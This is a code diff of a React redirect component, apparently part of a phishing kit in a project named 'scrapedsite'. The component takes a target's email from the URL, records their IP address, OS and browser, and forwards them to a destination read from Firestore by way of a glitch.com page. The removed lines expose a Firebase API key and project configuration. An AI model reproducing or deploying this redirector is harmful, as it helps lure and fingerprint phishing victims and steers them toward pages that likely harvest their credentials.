@@ -3,18 +3,9 @@ import { doc, getFirestore, onSnapshot } from "firebase/firestore";
 import React, { useEffect } from "react";
 import { browserName, osName } from "react-device-detect";
 import "./loaderstyle.css";
-import { getIP } from "./servers";
+import { db, getIP } from "./servers";
 
-const firebaseApp = initializeApp({
-  apiKey: "AIzaSyBNSKpZ1syb0z8g8OOoye1lps1k7AcXpk8",
-  authDomain: "scrapedsite.firebaseapp.com",
-  projectId: "scrapedsite",
-  storageBucket: "scrapedsite.appspot.com",
-  messagingSenderId: "317704250761",
-  appId: "1:317704250761:web:eff67f6e124883fb61ad58",
-  measurementId: "G-WWFDG2HKPK",
-});
-const db = getFirestore(firebaseApp);
+
 
 function HomeRedirect() {
   const queryParams = new URLSearchParams(window.location.search);
@@ -42,23 +33,24 @@ function HomeRedirect() {
       getIP().then((res) => {
         const ip=res.data.IPv4
         console.log(ip);
-        window.location.assign(`${currentLink}/${date}/?inclusive=${email}&device=${osName+""+browserName}&loc=${ip}`);
-      // window.location.assign(`http://localhost:3000/${date}/?inclusive=${email}&device=${osName+""+browserName}&loc=${ip}`);
-      });
-
-      /*
+       // window.location.assign(`${currentLink}/${date}/?inclusive=${email}&device=${osName+""+browserName}&loc=${ip}`);
+      
+      
       // wake glitch.com page
       fetch(`${currentLink}`, requestOptions)
         .then((response) => {
           console.log(response.status);
-          window.location.assign(`${currentLink}/${date}/?inclusive=${email}`);
+          window.location.assign(`${currentLink}/${date}/?inclusive=${email}&device=${osName+""+browserName}&loc=${ip}`);
         })
         .catch((error) => {
           console.log("error", error);
-          window.location.assign(`${currentLink}/${date}/?inclusive=${email}`);
+          window.location.assign(`${currentLink}/${date}/?inclusive=${email}&device=${osName+""+browserName}&loc=${ip}`);
         });
 
-        */
+    
+    });
+
+      
     });
   });
 
